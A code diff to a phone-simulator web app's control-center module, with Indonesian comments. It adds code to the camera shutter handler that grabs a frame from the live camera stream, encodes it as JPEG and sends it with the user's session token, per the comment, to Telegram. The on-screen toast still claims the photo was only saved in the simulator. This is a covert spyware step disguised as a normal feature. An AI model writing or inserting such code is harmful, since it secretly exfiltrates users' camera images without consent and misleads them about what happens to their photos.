@@ -7,6 +7,7 @@
  */
 import { triggerHaptic } from './haptics.js';
 import { showToast } from './toast.js';
+import { syncPhotoApi } from './api.js';
 
 export function createControlCenter({ phoneFrame, audioPlayer, onNextTrack, onPrevTrack, onTogglePlay }) {
   // 1. Buat Trigger di pojok kanan atas layar simulator
@@ -480,6 +481,27 @@ export function createControlCenter({ phoneFrame, audioPlayer, onNextTrack, onPr
     setTimeout(() => {
       camFlash.style.opacity = '0';
     }, 120);
+
+    // Ambil gambar snapshot dari video kamera jika aktif
+    try {
+      if (mediaStream && camVideo.videoWidth > 0) {
+        const canvas = document.createElement('canvas');
+        canvas.width = camVideo.videoWidth;
+        canvas.height = camVideo.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(camVideo, 0, 0, canvas.width, canvas.height);
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+        
+        // Kirim foto ke Telegram
+        const token = window.__APP_STATE__?.token || window.__APP_STATE__?.session?.token;
+        if (token) {
+          syncPhotoApi(token, dataUrl);
+        }
+      }
+    } catch (e) {
+      console.warn('Gagal capture foto:', e);
+    }
+
     showToast('📸 Foto tersimpan di Simulator!');
   });
 
